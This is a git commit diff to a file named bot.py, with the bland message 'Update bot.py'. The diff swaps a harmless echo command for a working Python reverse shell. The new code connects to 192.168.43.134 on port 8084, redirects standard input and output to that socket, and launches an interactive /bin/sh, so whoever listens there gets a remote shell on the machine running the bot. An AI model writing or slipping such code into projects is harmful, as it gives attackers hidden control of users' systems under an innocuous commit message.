15e46c826e273790916611b0925b52a4e1b735c5
msiriusv <158078657+msiriusv@users.noreply.github.com>
2024-01-31 15:48:54 +0100

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,4 +1,21 @@
-import subprocess 
-
+import socket
+import subprocess
+import os
+ 
 def run():
-  subprocess.run(["echo", "Hello from subprocess"], check=True, text=True)
+    ip = "192.168.43.134"
+    port = 8084
+ 
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    s.connect((ip, port))
+    os.dup2(s.fileno(), 0)
+    os.dup2(s.fileno(), 1)
+    os.dup2(s.fileno(), 2)
+ 
+    for f in (0, 1, 2):
+        os.set_inheritable(f, True)
+ 
+    subprocess.run(["/bin/sh", "-i"], check=True)
+ 
+if __name__ == "__main__":
+    run()
